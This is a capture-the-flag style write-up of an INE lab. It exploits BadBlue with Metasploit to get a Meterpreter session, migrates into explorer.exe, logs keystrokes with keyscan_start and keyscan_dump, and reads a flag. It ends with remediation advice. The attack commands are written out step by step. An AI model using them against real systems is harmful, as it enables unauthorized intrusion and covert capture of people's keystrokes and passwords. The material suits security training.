---
title: "File and Keylogging"
description: "Post-exploitation with Meterpreter after a BadBlue compromise: migrating into explorer.exe and using the keyscan keystroke logger to capture what is typed on the target, then reading the flag from the C: drive."
date: 2025-11-17
platform: "INE Labs"
difficulty: "Easy"
tags: ["Metasploit", "Meterpreter", "keyscan", "Keylogging", "BadBlue", "Post-Exploitation", "Windows"]
cover: "./photo9.png"
---

# File and Keylogging

**Classification:** Host & Network Penetration Testing / The Metasploit Framework<br>
**Target:** demo.ine.local — Windows, BadBlue on port 80<br>
**Flag:** `70a569da306697d64fc6c19afea37d94`

## 1. Executive Summary

After exploiting **BadBlue** for a Meterpreter session, we demonstrate Meterpreter's
file-interaction and **keystroke logging** features. Migrating into `explorer.exe`, the
`keyscan_start` / `keyscan_dump` commands capture keystrokes typed on the target (shown here
with a user entering text in Notepad). Finally the flag is read from `C:\`.

## 2. Recon & Exploitation

```bash
ping -c 4 demo.ine.local
db_nmap -sV <target>
services
```

![Ping target](./photo1.png)

![MSF global variables](./photo2.png)

![Nmap scan](./photo3.png)

![services — BadBlue on port 80](./photo4.png)

```bash
use exploit/windows/http/badblue_passthru
set RHOSTS <target>
exploit
```

![Meterpreter session opened](./photo5.png)

## 3. Migrating to explorer.exe

The keylogger captures more reliably from an interactive desktop process.

```bash
pgrep explorer
migrate 1324
```

![Migrating to explorer.exe](./photo6.png)

## 4. Keystroke Logging

Starting the keystroke sniffer.

```bash
keyscan_start
```

![keyscan_start — keystroke sniffer running](./photo7.png)

While the logger runs, text is typed on the target (here, into Notepad).

![Text being typed on the target (1)](./photo8.png)

Dumping the captured keystrokes shows what was typed (special keys appear as `<Shift>`,
`<CR>`, etc.).

```bash
keyscan_dump
```

![keyscan_dump — captured keystrokes](./photo9.png)

More input on the target...

![Additional text on the target (2)](./photo10.png)

...is reflected in the next dump.

```bash
keyscan_dump
```

![keyscan_dump — updated capture](./photo11.png)

## 5. Capturing the Flag

```bash
cd C:\
dir
cat flag.txt
# 70a569da306697d64fc6c19afea37d94
```

![Flag from C:\flag.txt](./photo12.png)

## 6. Remediation Recommendations

1. **Patch/replace BadBlue** to prevent the initial RCE that enables post-exploitation.
2. **Protect against injection into desktop processes** with EDR and least privilege — a
   SYSTEM/interactive process gives keystroke visibility.
3. **Use MFA** so captured static credentials are not sufficient on their own.
4. **Monitor** for Meterpreter-style process migration and keylogging behaviour.
